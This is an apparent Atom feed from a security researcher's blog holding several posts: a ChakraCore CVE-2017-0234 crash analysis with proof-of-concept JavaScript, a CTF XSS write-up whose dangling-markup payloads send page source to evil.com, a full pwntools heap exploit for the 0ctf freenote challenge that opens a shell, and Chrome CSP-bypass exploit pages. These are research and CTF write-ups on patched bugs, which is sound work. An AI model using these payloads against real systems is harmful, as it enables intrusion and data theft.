<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>math1as&#39; blog</title>
  
  <subtitle>Security Researcher</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.math1as.com/"/>
  <updated>2018-02-07T17:14:47.990Z</updated>
  <id>http://www.math1as.com/</id>
  
  <author>
    <name>math1as</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2017-0234 analysis</title>
    <link href="http://www.math1as.com/2018/02/07/CVE-2017-0234-analysis/"/>
    <id>http://www.math1as.com/2018/02/07/CVE-2017-0234-analysis/</id>
    <published>2018-02-07T15:31:06.000Z</published>
    <updated>2018-02-07T17:14:47.990Z</updated>
    
    <content type="html"><![CDATA[<p>About the Microsoft Edge Vuln used on pwn2own 2017</p><p>debug enviorment: Windows10 + Visual Studio 2015 + ChakraCore SourceCode</p><p>POC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">function write(n)</div><div class="line">&#123;</div><div class="line"> for(var i=0;i&lt;n;i++)</div><div class="line"> &#123;</div><div class="line"> view[0x40000]=num;</div><div class="line"> &#125;</div><div class="line">&#125;</div><div class="line">var view = new Uint32Array(0x10000);</div><div class="line">write(0,1000,1,0x3)</div><div class="line">write(0,1000,1,0x3)</div></pre></td></tr></table></figure><p>Let’s start</p><p>the debugger throw out an exception “access violation” in JIT code<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0000002DE9040084  mov         dword ptr [rax+100000h],3</div></pre></td></tr></table></figure></p><p>so we need to see what happened</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">dd rax+100000h</div><div class="line">0x00000057800E0000 ??? ??? ???</div></pre></td></tr></table></figure><p>hum,it’s a simple OOB</p><p>How does it happend?</p><p>see the patch</p><p><a href="https://github.com/Microsoft/ChakraCore/commit/a1345ad48064921e8eb45fa0297ce405a7df14d3" target="_blank" rel="external">https://github.com/Microsoft/ChakraCore/commit/a1345ad48064921e8eb45fa0297ce405a7df14d3</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">-            eliminatedLowerBoundCheck = true;</div><div class="line">-            eliminatedUpperBoundCheck = true;</div><div class="line">-            canBailOutOnArrayAccessHelperCall = false;</div><div class="line">+            // Unless we&apos;re in asm.js (where it is guaranteed that virtual typed array accesses cannot read/write beyond 4GB),</div><div class="line">+            // check the range of the index to make sure we won&apos;t access beyond the reserved memory beforing eliminating bounds</div><div class="line">+            // checks in jitted code.</div><div class="line">+            if (!GetIsAsmJSFunc())</div><div class="line">+            &#123;</div><div class="line">+                IR::RegOpnd * idxOpnd = baseOwnerIndir-&gt;GetIndexOpnd();</div><div class="line">+                if (idxOpnd)</div><div class="line">+                &#123;</div><div class="line">+                    StackSym * idxSym = idxOpnd-&gt;m_sym-&gt;IsTypeSpec() ? idxOpnd-&gt;m_sym-&gt;GetVarEquivSym(nullptr) : idxOpnd-&gt;m_sym;</div><div class="line">+                    Value * idxValue = FindValue(idxSym);</div><div class="line">+                    IntConstantBounds idxConstantBounds;</div><div class="line">+                    if (idxValue &amp;&amp; idxValue-&gt;GetValueInfo()-&gt;TryGetIntConstantBounds(&amp;idxConstantBounds))</div><div class="line">+                    &#123;</div><div class="line">+                        BYTE indirScale = Lowerer::GetArrayIndirScale(baseValueType);</div><div class="line">+                        int32 upperBound = idxConstantBounds.UpperBound();</div><div class="line">+                        int32 lowerBound = idxConstantBounds.LowerBound();</div><div class="line">+                        if (lowerBound &gt;= 0 &amp;&amp; ((static_cast&lt;uint64&gt;(upperBound) &lt;&lt; indirScale) &lt; MAX_ASMJS_ARRAYBUFFER_LENGTH))</div><div class="line">+                        &#123;</div><div class="line">+                            eliminatedLowerBoundCheck = true;</div><div class="line">+                            eliminatedUpperBoundCheck = true;</div><div class="line">+                            canBailOutOnArrayAccessHelperCall = false;</div><div class="line">+                        &#125;</div><div class="line">+                    &#125;</div><div class="line">+                &#125;</div><div class="line">+            &#125;</div><div class="line">+            else</div><div class="line">+            &#123;</div><div class="line">+                eliminatedLowerBoundCheck = true;</div><div class="line">+                eliminatedUpperBoundCheck = true;</div><div class="line">+                canBailOutOnArrayAccessHelperCall = false;</div><div class="line">+            &#125;</div><div class="line">         &#125;</div><div class="line">     &#125;</div></pre></td></tr></table></figure><p>  The problem is clear</p><p>  Microsoft make a aggressive strategy: that they remove the bound check of virtual typed array</p><p>  and then, we restart the program,and I find an interesting thing</p><p>  The program use VirtualAlloc() function instead of GC, when we alloc a “big” virtual typed array</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">buffer=???</div><div class="line">var view = new Uint32Array(buffer);</div></pre></td></tr></table></figure><p>  That is to say</p><p>  when buffer is greater than a value , then it would use VirtualAlloc() function to ask for 4GB space at one time</p><p>  then it would commit the real size (buffer) of the array,which could be used.</p><p>  so what is the meaning of this ? let’s discuss about it later</p><p> come back to think a problem: how does ChakraCore work , and analyse about the logic of this vuln</p><p> how does ChakraCore works ?</p><p> it could work in two ways</p><ol><li><p>interpreter mode (normal)</p></li><li><p>JIT mode (much more faster)</p><p>so,how does interpreter mode works</p><p>the process look like this</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"> CallFunction()</div><div class="line"> ProfiledLoopBodyStart()</div><div class="line"> amd64_CallFunction()</div><div class="line"> CheckCodeGenThunk()</div><div class="line"> NativeCodeGenerator::CheckCodeGen()</div><div class="line"> DelayDynamicInterpreterThunk@InterpreterStackFrame()</div><div class="line">InterpreterStackFrame::EnsureDynamicInterpreterThunk()</div><div class="line">jmp code</div><div class="line">InterpreterStackFrame::InterpreterThunk()</div></pre></td></tr></table></figure></li></ol><p> when handle the loop in javascript</p><p> let’s see the Call Stack</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">chakracore!Js::InterpreterStackFrame::InterpreterHelper</div><div class="line">  chakracore!Js::InterpreterStackFrame::Process</div><div class="line">   chakracore!Js::InterpreterStackFrame::ProcessProfiled</div><div class="line">    chakracore!Js::InterpreterStackFrame::OP_ProfiledLoopBodyStart</div><div class="line">     chakracore!Js::InterpreterStackFrame::ProfiledLoopBodyStart</div><div class="line">      chakracore!Js::InterpreterStackFrame::DoLoopBodyStart</div></pre></td></tr></table></figure><p>when JIT code does not generated (it would use a new thread to do this) , ChakraCore would use ProfiledLoopBodyStart as the handler<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">const byte * InterpreterStackFrame::OP_ProfiledLoopBodyStart(const byte * ip)</div><div class="line">&#123;</div><div class="line">    uint32 C1 = m_reader.GetLayout&lt;OpLayoutT_Unsigned1&lt;LayoutSizePolicy&lt;layoutSize&gt;&gt;&gt;(ip)-&gt;C1;</div><div class="line"></div><div class="line">    if(profiled || isAutoProfiling)</div><div class="line">    &#123;</div><div class="line">        this-&gt;currentLoopCounter++;</div></pre></td></tr></table></figure></p><p>and the variable currentLoopCounter shows how many time the function is called</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">    InterpreterStackFrame::CheckIfLoopIsHot(uint profiledLoopCounter)</div><div class="line">    &#123;</div><div class="line">        Js::FunctionBody *fn = this-&gt;function-&gt;GetFunctionBody();</div><div class="line">        if (!fn-&gt;GetHasHotLoop() &amp;&amp;  profiledLoopCounter &gt; (uint)CONFIG_FLAG(JitLoopBodyHotLoopThreshold))</div><div class="line">        &#123;</div><div class="line">#ifdef ENABLE_DEBUG_CONFIG_OPTIONS</div><div class="line">            if(PHASE_TRACE(Js::JITLoopBodyPhase, fn))</div><div class="line">            &#123;</div><div class="line">                char16 debugStringBuffer[MAX_FUNCTION_BODY_DEBUG_STRING_SIZE];</div><div class="line"></div><div class="line">                Output::Print(</div><div class="line">                    _u(&quot;Speculate Jit set for this function with loopbody: function: %s (%s)\n&quot;),</div><div class="line">                    fn-&gt;GetDisplayName(),</div><div class="line">                    fn-&gt;GetDebugNumberSet(debugStringBuffer));</div><div class="line">                Output::Flush();</div><div class="line">            &#125;</div><div class="line">#endif</div><div class="line">            fn-&gt;SetHasHotLoop();</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure><p>and then if the variable is greater than (uint)CONFIG_FLAG(JitLoopBodyHotLoopThreshold),it would turn into JIT mode</p><p>so that the process turn into this</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"> CallFunction()</div><div class="line"> ProfiledLoopBodyStart()</div><div class="line"> amd64_CallFunction()</div><div class="line"> CheckCodeGenThunk()</div><div class="line"> NativeCodeGenerator::CheckCodeGen()</div><div class="line"> DelayDynamicInterpreterThunk@InterpreterStackFrame()</div><div class="line">InterpreterStackFrame::EnsureDynamicInterpreterThunk()</div><div class="line">jmp code</div><div class="line">JIT code</div></pre></td></tr></table></figure><p> how could it call JIT code rather than interpreter ?</p><p> in amd64_CallFunction() where call CheckCodeGenThunk()<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ifdef _CONTROL_FLOW_GUARD</div><div class="line">        call    [__guard_dispatch_icall_fptr]</div><div class="line">else</div><div class="line">        call rax</div></pre></td></tr></table></figure></p><p>rax=the address of JIT code</p><p>OK,so that we know about how ChakraCore works</p><p>then,how about the patch,could we get into the logic which disable the bound check?</p><p>once we patch it,we’ll find that we could not pass the check</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (idxOpnd)</div></pre></td></tr></table></figure><p>i find that if we access the array index through constant , then it would get into</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">// Const-prop an indir opnd&apos;s constant index into its offset</div><div class="line">IR::Opnd *srcs[] = &#123; instr-&gt;GetSrc1(), instr-&gt;GetSrc2(), instr-&gt;GetDst() &#125;;</div><div class="line">for(int i = 0; i &lt; sizeof(srcs) / sizeof(srcs[0]); ++i)</div><div class="line">&#123;</div><div class="line">    const auto src = srcs[i];</div><div class="line">    if(!src || !src-&gt;IsIndirOpnd())</div><div class="line">    &#123;</div><div class="line">        continue;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    const auto indir = src-&gt;AsIndirOpnd();</div><div class="line">    if(opnd == indir-&gt;GetIndexOpnd())</div><div class="line">    &#123;</div><div class="line">        Assert(indir-&gt;GetScale() == 0);</div><div class="line">        GOPT_TRACE_OPND(opnd, _u(&quot;Constant prop indir index into offset (value: %d)\n&quot;), intConstantValue);</div><div class="line">        this-&gt;CaptureByteCodeSymUses(instr);</div><div class="line">        indir-&gt;SetOffset(intConstantValue);</div><div class="line">        indir-&gt;SetIndexOpnd(nullptr);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>call indir-&gt;SetIndexOpnd(nullptr)</p><p>so we need to pass a variable like this</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">function write(j)</div><div class="line">&#123;</div><div class="line"> for(var i=0;i&lt;0xc000;i++)</div><div class="line"> &#123;</div><div class="line">    if(j&gt;=0 &amp;&amp; j&lt;=0x60000) view[j]=0x3;</div><div class="line"> &#125;</div><div class="line">&#125;</div><div class="line">var view = new Uint32Array(0x10000);</div><div class="line">write(0x40000)</div><div class="line">write(0x40000)</div></pre></td></tr></table></figure><p>then we get into the logic which disabled the bound check, and ChakraCore crash again (of course,could not bypass the patch because we are in the 4GB space)</p><p>:( ok,I’ll finish the exploit in future,thank you</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;About the Microsoft Edge Vuln used on pwn2own 2017&lt;/p&gt;
&lt;p&gt;debug enviorment: Windows10 + Visual Studio 2015 + ChakraCore SourceCode&lt;/p&gt;
&lt;p
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>L-CTF 2017 easy xss</title>
    <link href="http://www.math1as.com/2017/12/15/L-CTF-2017-easy-xss/"/>
    <id>http://www.math1as.com/2017/12/15/L-CTF-2017-easy-xss/</id>
    <published>2017-12-15T17:09:06.000Z</published>
    <updated>2018-02-07T18:19:02.042Z</updated>
    
    <content type="html"><![CDATA[<p>L-CTF 2017 easy xss</p><p>2 ways to solve it , all in the writeup</p><p>the key point is how to leak the information through the html parser</p><p>from <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=680970" target="_blank" rel="external">https://bugs.chromium.org/p/chromium/issues/detail?id=680970</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=&apos;//evil.com/?p=</div></pre></td></tr></table></figure></p><p>the src attribute would eat the html sourcecode until next ‘</p><p>to make it easier, I use the old chrome to perform this challenge</p><p>but,there is still some skills to bypass the patch in the stable version</p><p>there are 2 ways:</p><p>need interactive<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a ping=&apos;//evil.com/?p=</div></pre></td></tr></table></figure></p><p>it’s hard to use in a real attack</p><p>without interactive</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;iframe src=&apos;//evil.com/evil.html&apos; name=&apos;</div></pre></td></tr></table></figure><p>evil.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">fetch(&apos;//evil.com/?p=&apos;+escape(name))</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure><p>then we get the leak sourcecode,which contains the flag.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;L-CTF 2017 easy xss&lt;/p&gt;
&lt;p&gt;2 ways to solve it , all in the writeup&lt;/p&gt;
&lt;p&gt;the key point is how to leak the information through the html p
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>0ctf 2015 freenote</title>
    <link href="http://www.math1as.com/2017/10/30/freenote/"/>
    <id>http://www.math1as.com/2017/10/30/freenote/</id>
    <published>2017-10-30T13:44:22.000Z</published>
    <updated>2017-10-30T13:45:56.879Z</updated>
    
    <content type="html"><![CDATA[<p>0ctf 2015 freenote</p><p>double free + GOT rewrite</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">note=process(<span class="string">'./freenote'</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">newnote</span><span class="params">(x)</span>:</span></div><div class="line">  note.recvuntil(<span class="string">'Your choice: '</span>)</div><div class="line">  note.send(<span class="string">'2\n'</span>)</div><div class="line">  note.recvuntil(<span class="string">'Length of new note: '</span>)</div><div class="line">  note.send(str(len(x)) + <span class="string">'\n'</span>)</div><div class="line">  note.recvuntil(<span class="string">'Enter your note: '</span>)</div><div class="line">  note.send(x)</div><div class="line">  <span class="comment">#print note.recv()</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(x)</span>:</span></div><div class="line">  note.recvuntil(<span class="string">'Your choice: '</span>)</div><div class="line">  note.send(<span class="string">'4\n'</span>)</div><div class="line">  note.recvuntil(<span class="string">'Note number: '</span>)</div><div class="line">  note.send(str(x)+<span class="string">'\n'</span>)</div><div class="line">  <span class="comment">#print note.recv()</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">editnote</span><span class="params">(x,y)</span>:</span></div><div class="line">  note.recvuntil(<span class="string">'Your choice: '</span>)</div><div class="line">  note.send(<span class="string">'3\n'</span>)</div><div class="line">  note.recvuntil(<span class="string">'Note number: '</span>)</div><div class="line">  note.send(str(x)+<span class="string">'\n'</span>)</div><div class="line">  note.recvuntil(<span class="string">'Length of note: '</span>)</div><div class="line">  note.send(str(len(y))+<span class="string">'\n'</span>)</div><div class="line">  note.recvuntil(<span class="string">'Enter your note: '</span>)</div><div class="line">  note.send(y)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">listnote</span><span class="params">(x)</span>:</span></div><div class="line">  note.recvuntil(<span class="string">'Your choice: '</span>)</div><div class="line">  note.send(<span class="string">'1\n'</span>)</div><div class="line">  note.recvuntil(x)</div><div class="line">  s=note.recvuntil(<span class="string">'\n'</span>)</div><div class="line">  <span class="keyword">return</span> s</div><div class="line">newnote(<span class="string">'B'</span>)</div><div class="line">newnote(<span class="string">'B'</span>)</div><div class="line">newnote(<span class="string">'B'</span>)</div><div class="line">newnote(<span class="string">'B'</span>)</div><div class="line">delnote(<span class="number">0</span>)</div><div class="line">delnote(<span class="number">2</span>)</div><div class="line">newnote(<span class="string">'B'</span>*<span class="number">0x8</span>)</div><div class="line">result=listnote(<span class="string">'B'</span>*<span class="number">0x8</span>)</div><div class="line">result=u64(result[:<span class="number">-1</span>].ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x1940</span></div><div class="line"><span class="comment">#leak the addr of heap_base</span></div><div class="line"><span class="keyword">print</span> <span class="string">'[+] heap base: '</span>+ hex(result)</div><div class="line">heap_base=result</div><div class="line">raw_file=ELF(<span class="string">'freenote'</span>)</div><div class="line">libc=ELF(<span class="string">'libc.so.6'</span>)</div><div class="line">off_system=libc.symbols[<span class="string">'system'</span>]</div><div class="line">off_free=libc.symbols[<span class="string">'free'</span>]</div><div class="line">off_puts=libc.symbols[<span class="string">'puts'</span>]</div><div class="line">free_got=raw_file.got[<span class="string">'free'</span>]</div><div class="line">puts_got=raw_file.got[<span class="string">'puts'</span>]</div><div class="line">malloc_got=raw_file.got[<span class="string">'malloc'</span>]</div><div class="line">newnote(<span class="string">'A'</span>*<span class="number">0x80</span>)</div><div class="line">newnote(<span class="string">'B'</span>*<span class="number">0x80</span>)</div><div class="line">newnote(<span class="string">'C'</span>*<span class="number">0x80</span>)</div><div class="line">delnote(<span class="number">0</span>)</div><div class="line">delnote(<span class="number">1</span>)</div><div class="line">payload=p64(<span class="number">0x80</span>)+p64(<span class="number">0x80</span>)</div><div class="line">payload+=p64(heap_base+<span class="number">0x30</span><span class="number">-3</span>*<span class="number">0x8</span>)</div><div class="line">payload+=p64(heap_base+<span class="number">0x30</span><span class="number">-2</span>*<span class="number">0x8</span>)</div><div class="line">payload=payload.ljust(<span class="number">0x80</span>,<span class="string">'A'</span>)</div><div class="line"><span class="comment">#chunk B</span></div><div class="line">payload+=p64(<span class="number">0x80</span>)</div><div class="line">payload+=p64(<span class="number">0x90</span>)</div><div class="line">newnote(payload)</div><div class="line">delnote(<span class="number">1</span>)</div><div class="line">payload=p64(<span class="number">0x1</span>)+p64(<span class="number">0x1</span>)</div><div class="line">payload+=p64(<span class="number">0x8</span>)</div><div class="line">payload+=p64(free_got)</div><div class="line">payload=payload.ljust(<span class="number">0x90</span>)</div><div class="line">editnote(<span class="number">0</span>,payload) <span class="comment">#the error</span></div><div class="line"><span class="keyword">print</span> <span class="string">'info'</span></div><div class="line">result=listnote(<span class="string">'0. '</span>)</div><div class="line">result=u64(result[:<span class="number">-1</span>].ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</div><div class="line"><span class="keyword">print</span> <span class="string">'[+]addr_free= '</span>,hex(result)</div><div class="line">libc_base=result-off_free</div><div class="line">system_addr=libc_base+off_system</div><div class="line">puts_addr=libc_base+libc.symbols[<span class="string">'puts'</span>]</div><div class="line">read_addr=libc_base+libc.symbols[<span class="string">'read'</span>]</div><div class="line"><span class="keyword">print</span> hex(system_addr)</div><div class="line">payload=p64(system_addr)</div><div class="line">editnote(<span class="number">0</span>,payload)</div><div class="line">newnote(<span class="string">'sh\0'</span>)</div><div class="line">delnote(<span class="number">6</span>)</div><div class="line">note.interactive()</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;0ctf 2015 freenote&lt;/p&gt;
&lt;p&gt;double free + GOT rewrite&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;l
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>migration</title>
    <link href="http://www.math1as.com/2017/10/30/migration/"/>
    <id>http://www.math1as.com/2017/10/30/migration/</id>
    <published>2017-10-30T12:11:06.000Z</published>
    <updated>2017-10-30T12:12:56.776Z</updated>
    
    <content type="html"><![CDATA[<p>I migrate my blog to here due to the potential typecho vuln</p><p>I’ll pick some of my old posts ,and put them here.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;I migrate my blog to here due to the potential typecho vuln&lt;/p&gt;
&lt;p&gt;I’ll pick some of my old posts ,and put them here.&lt;/p&gt;

      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>inherited strategy in Chrome CSP Bypass</title>
    <link href="http://www.math1as.com/2017/09/08/Chrome-unsafe-inline-CSP-Bypass/"/>
    <id>http://www.math1as.com/2017/09/08/Chrome-unsafe-inline-CSP-Bypass/</id>
    <published>2017-09-08T17:51:56.000Z</published>
    <updated>2018-02-07T18:15:36.430Z</updated>
    
    <content type="html"><![CDATA[<p>for CSP, the inherit strategy is a important thing. once it has some logical problems,it would result in CSP bypass</p><p>M60</p><p>CSP not inherited after navigation to JavaScript scheme uri</p><p>check in void Document::InitContentSecurityPolicy() of Document.cpp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">if (url_.IsEmpty() || url_.ProtocolIsAbout() || url_.ProtocolIsData() ||</div><div class="line">url_.ProtocolIs(&quot;blob&quot;) || url_.ProtocolIs(&quot;filesystem&quot;)) &#123;</div><div class="line">GetContentSecurityPolicy()-&gt;CopyStateFrom(policy_to_inherit);</div></pre></td></tr></table></figure><p>it ignored javascript scheme</p><p>exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;iframe src=&quot;javascript:&apos;&lt;iframe src=attacker.com \/&gt;&apos;&quot;/&gt;</div></pre></td></tr></table></figure><p>M63</p><p>Plznavigate in iframe did not inherit CSP after navigation to about:blank</p><p>old strategy in document.cpp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">  if (policy_to_inherit &amp;&amp; IsPluginDocument())</div><div class="line">    GetContentSecurityPolicy()-&gt;CopyPluginTypesFrom(policy_to_inherit);</div><div class="line">  GetContentSecurityPolicy()-&gt;BindToExecutionContext(this);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>so that if navigation happends(about:blank has the same origin as its opener), CSP could be bypassed</p><p>fixed</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">void Document::InitContentSecurityPolicy(</div><div class="line">    ContentSecurityPolicy* csp,</div><div class="line">    const ContentSecurityPolicy* policy_to_inherit) &#123;</div><div class="line">  SetContentSecurityPolicy(csp ? csp : ContentSecurityPolicy::Create());</div><div class="line"></div><div class="line">  GetContentSecurityPolicy()-&gt;BindToExecutionContext(this);</div></pre></td></tr></table></figure><p>exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;none&apos;;script-src &apos;unsafe-inline&apos;;&quot;&gt;</div><div class="line">&lt;iframe id=&quot;x&quot; srcdoc=&quot;&lt;a href=&apos;about:blank&apos;&gt;123&lt;/a&gt;&quot;&gt;&lt;/iframe&gt;</div><div class="line">&lt;script&gt;</div><div class="line">function pwn()</div><div class="line">&#123;</div><div class="line">x=document.getElementById(&apos;x&apos;);</div><div class="line">x.location=&quot;&quot;;</div><div class="line">x.contentDocument.write(&apos;&lt;iframe src=&quot;http://www.qq.com&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(&quot;inherit the origin,but csp lost&quot;)&lt;\/script&gt;&apos;);</div><div class="line">&#125;</div><div class="line">pwn();</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;for CSP, the inherit strategy is a important thing. once it has some logical problems,it would result in CSP bypass&lt;/p&gt;
&lt;p&gt;M60&lt;/p&gt;
&lt;p&gt;CSP
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>L-CTF-2016-pwn200</title>
    <link href="http://www.math1as.com/2017/04/09/L-CTF-2016-pwn200/"/>
    <id>http://www.math1as.com/2017/04/09/L-CTF-2016-pwn200/</id>
    <published>2017-04-09T17:41:06.000Z</published>
    <updated>2018-02-07T17:44:33.073Z</updated>
    
